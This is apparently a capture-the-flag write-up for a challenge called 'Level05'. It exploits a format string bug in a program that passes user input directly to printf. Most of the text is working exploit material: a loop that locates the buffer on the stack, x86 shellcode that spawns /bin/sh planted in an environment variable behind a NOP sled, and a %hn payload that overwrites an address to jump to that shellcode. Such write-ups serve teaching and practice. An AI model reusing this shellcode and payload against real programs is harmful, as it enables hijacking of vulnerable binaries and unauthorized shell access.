# Level05
This program is just a fgets call on stdin, converts characters in the buffer from uppercase to lowercase and prints the buffer with printf.
Since the buffer is directly used in printf, we can use a format string exploit.

We search the index of the buffer in the stack:
```bash
for((i=0; i<200; i++)); do echo "Index $i" && ./level05 <<< "aaaa%$i\$x"; done | grep -B1 61616161
```

Which give us:
```
Index 10
aaaa61616161
```

We inject our shellcode in the environment:
```bash
export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`
```

We can use this payload:
```bash
cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05
```

